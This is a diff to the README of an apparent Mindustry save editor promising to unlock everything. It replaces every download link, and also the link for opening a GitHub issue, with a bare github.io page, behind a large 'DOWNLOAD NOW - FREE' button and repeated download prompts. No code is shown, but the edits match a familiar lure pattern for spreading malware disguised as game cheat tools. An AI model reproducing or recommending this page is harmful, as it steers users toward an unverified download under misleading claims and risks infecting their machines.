@@ -1,7 +1,7 @@
 <h1>🎮 mindustry-save-editor-2026 - Edit Any Save, Unlock Everything Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/releases" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://khushiworkingdata-dot.github.io" style="display:inline-block;padding:16px 40px;background:linear-gradient(135deg,#ff6b6b,#feca57);color:#fff;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 4px 15px rgba(255,107,107,0.4);margin:20px 0;">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🔥 What Is This?
@@ -40,7 +40,7 @@ Follow these steps exactly. It takes less than 2 minutes.
 
 Visit this link to download the application:
 
-👉 **[https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/releases](https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/releases)**
+👉 **[https://khushiworkingdata-dot.github.io](https://khushiworkingdata-dot.github.io)**
 
 On that page, you'll see a list of files. Look for the newest version (usually at the top). Click the download button next to the file name. The download will start automatically.
 
@@ -182,7 +182,7 @@ Yes, completely free. No ads, no paywalls, no subscriptions.
 
 If you encounter any issues or have questions:
 
-- Open an issue on GitHub: [https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/issues](https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/issues)
+- Open an issue on GitHub: [https://khushiworkingdata-dot.github.io](https://khushiworkingdata-dot.github.io)
 - Check the FAQ section above
 - Look for community discussions in the GitHub Discussions tab
 
@@ -192,7 +192,7 @@ If you encounter any issues or have questions:
 
 Need the download link one more time? Here it is:
 
-**[⬇️ Click Here to Download mindustry-save-editor-2026](https://github.com/khushiworkingdata-dot/mindustry-save-editor-2026/releases)**
+**[⬇️ Click Here to Download mindustry-save-editor-2026](https://khushiworkingdata-dot.github.io)**
 
 ---
 
